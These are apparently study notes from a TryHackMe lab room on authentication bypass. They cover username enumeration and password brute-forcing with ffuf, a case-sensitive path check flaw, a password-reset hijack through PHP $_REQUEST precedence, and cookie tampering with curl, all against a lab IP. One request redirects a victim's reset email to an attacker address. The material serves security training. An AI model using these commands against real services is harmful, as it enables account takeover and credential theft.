# Authentication Bypass

## Username Enumeration

- create a list of valid usernames

If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.182.156/customers/signup -mr "username already exists"
```

- -w : wordlist
- -X : request method
- -d : data to be send
- -H : header
- -u : url
- -mr : text on the page we are looking for to validate we've found a valid username.

---

## Brute Force

A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

```    
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.182.156/customers/login -fc 200
```

- -w : wordlist (W1, W2)
- W1 : usernames
- W2 : passwords
- -fc : Check for an HTTP status code other than 200.

---

## Logic Flaw

- Sometimes authentication processes contain logic flaws. 
- A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/58e63d7810ac4b23051e1dd4a24ef792.png)


#### Logic Flaw Example

**Example 1**:

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.

```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```


Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

**Example 2**:

We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.182.156/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".


For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.


At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.


Curl Request 1:
```
user@tryhackme$ curl 'http://10.10.182.156/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

- The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data.

If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

Curl Request 2:
```  
user@tryhackme$ curl 'http://10.10.182.156/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm

Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

Curl Request 2 (but using your @acmeitsupport.thm account):

```
user@tryhackme:~$ curl 'http://10.10.182.156/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

---

## Cookie Tampering


- Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

#### Plain Text

The contents of some cookies can be in plain text, and it is obvious what they do. 

Take, for example, if these were the cookie set after a successful login:

`Set-Cookie: logged_in=true; Max-Age=3600; Path=/`
`Set-Cookie: admin=false; Max-Age=3600; Path=/`

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:
Curl Request 1

```
user@tryhackme$ curl http://10.10.182.156/cookie-test
```

We can see we are returned a message of: Not Logged In

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:

Curl Request 2
```  
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.182.156/cookie-test
```

We are given the message: Logged In As A User

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

Curl Request 3
```   
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.182.156/cookie-test
```

This returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.


#### Hashing


- Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.

- Same input string can significantly differ depending on the hash method in use

- Even though the hash is irreversible, the same output is produced every time.


#### Encoding


- Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible.

- Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

- Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`

